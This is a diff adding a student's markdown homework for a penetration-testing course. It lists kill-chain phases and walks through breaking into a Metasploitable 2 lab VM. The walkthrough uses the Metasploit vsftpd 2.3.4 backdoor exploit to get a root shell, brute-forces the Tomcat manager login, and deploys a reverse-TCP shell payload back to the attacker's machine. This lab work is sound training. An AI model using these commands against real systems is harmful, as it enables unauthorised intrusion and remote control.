@@ -90,17 +90,139 @@ passive: company webpage, linkedIn, financial records, search engines
 active: port scanning, banner grabbing, service detection scans
 
 ### Weaponization
+metasploit, creating a fake webpage, writing a phising email
 
 ### Delivery
+picking specific exploitable program in metasploit (web delivery), sending emails, plugging in a USB stick
 
 ### Exploitation
+exploit on metasploit, email attachments opened by target user, logging in with phished credentials
 
 ### Installation
+meterpreter, installing backdoors, schedulers and similar to regain access
 
 ### Command and control (C2)
+shell, privilege escalation, cracking downloaded password hashes
 
 ### Actions on objectives
+metasploits downloading, shutting down functions, spreading misinformation, recording meetings with webcam
 
 ## b) Install Metaspoitable 2. Break in in multiple ways.
 
+### Install and setup
+
+Downloaded the metasploitable zip which contained .vmdk virtual machine file, ran it in VirtualBox Manager. Added to the machine a Host-only network adapter, also to the Kali virtualbox. Disconnected Kalis other network adapter to take it offline.
+
+![VM network adapter settings](/week-2/vm-adapter.png)
+
+Logged into metasploitable and ran ifconfig.
+
+![ifconfig](/week-2/ifconfig.png)
+
+Took down IP-address. Ran traceroute on Kali to make sure the network was set up right and tried to send a ping to hs.fi to make sure it was offline.
+
+`msfconsole`
+
+No database connected. Started postgres with `systemctl start postgresql` in another terminal. Created db for metasploit `sudo msfdb init`. Exited msfconsole and restarted it.
+
+`workspace -a metasploitable` Db works, workspace is created.
+
+Portscanned target with `db_nmap -sV 192.168.56.101`
+
+![Nmap results](/week-2/nmap.png)
+
+### First entry, ftp
+
+Picked the ftp-service to study first. Version is ProFTPD 1.3.1.
+
+`search ProFTPD`
+
+![search results](/week-2/ms-search.png)
+
+Out of these options number 4 looks good. Its rated excellent and has a Check-function, version looks right.
+To read more, `info 4`. Turns out version isnt right after all. Going through all the other exploits shown by the search, none of them are for the right version. I googled "proftpd 1.3.1 cve" and there are vulnerabilities, but the exploits dont seem to be in my version of metasploit. There is also another ftp-service running, version vsftpd 2.3.4. Running a search for it (with version number included this time) looks promising. 
+
+![second search results](/week-2/search-vsftpd.png)
+
+Looking at the info for the exploit, default port setting 21 is correct. There is no checking module so Im just going for it.
+
+`use 0`
+
+`set RHOST 192.168.56.101`
+
+Trying it with the default payload, as it is a unix system.
+
+`exploit` It worked!
+
+![exploit](/week-2/vsftpd-exploit.png)
+
+`shell` gives us a bash shell with root. I look at the files and leave a little mark with `echo "vsftpd done" > exploited.txt` and call it a win.
+
+![terminal](/week-2/vsftpd-bash.png)
+
+### Second entry, tomcat
+
+Going to try the http this time, so `search Apache httpd`. Results don't look too promising so i just open up the site in a browser and look around. Theres phpMyAdmin, mutillidae, Damn vulnerable Web Application. Leaving these alone for now, since we may look at more web stuff later in the course. 
+
+Looking at the other http service, theres a tomcat server. `search Apache tomcat` shows an exploit mentioning an exposed manager-page, and looking at the page from the browser, there it is!
+
+![Tomcat exploit info](/week-2/tomcat-info.png)
+
+`use 5`
+`set RHOST 192.168.56.101`
+`set RPORT 8180`
+`exploit`
+
+Failing. 
+
+![Tomcat exploit failed](/week-2/tomcat-fail.png)
+
+This line "Failed: Error requesting /manager/html/serverinfo" seems to be the critical one.
+
+Trying another exploit, nro 6 on the list. Seems to be similar but using a POST instead of PUT request.
+
+`use 6`
+`set RHOST 192.168.56.101`
+`set RPORT 8180`
+
+Same result as earlier. Now im thinking we will have to first find out the login credentials for the tomcat manager and then use this exploit to gain further access. Looking online I found an [article](https://pentestlab.blog/2012/03/22/apache-tomcat-exploitation/) also pointing that way. 
+
+There is an auxiliary module scanner/http/tomcat_mgr_login. It looks like its going to try to bruteforce the login.
+
+`use 19`
+`set RHOST 192.168.56.101`
+`set RPORT 8180`
+
+Really exciting to watch it work. We have our credentials!
+
+![Tomcat exploit failed](/week-2/tomcat-login.png)
+
+`use 6`
+`set HttpPassword tomcat`
+`set HttpUsername tomcat`
+`exploit`
+
+No errors, but no session created. Think the payload is wrong.
+After some attempts at different payloads and looking around online I figured out I needed to give the exploit a localhost address to connect to.
+
+`set payload java/shell/reverse_tcp`
+`set lhost 192.168.56.102`
+`set lport 4321` 
+`exploit`
+
+Works!
+
+![Tomcat exploit success](/week-2/tomcat-success.png)
+
 ## c) Install a machine from VulnHub. Break in.
+
+
+
+## Sources
+
+https://subscription.packtpub.com/book/networking_and_servers/9781788623179/1/ch01lvl1sec19/configuring-postgresql
+https://learning.oreilly.com/library/view/mastering-metasploit-/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-30
+https://www.cvedetails.com/vulnerability-list/vendor_id-9520/product_id-16873/version_id-99593/Proftpd-Proftpd-1.3.1.html
+https://pentestlab.blog/2012/03/22/apache-tomcat-exploitation/
+https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/
+
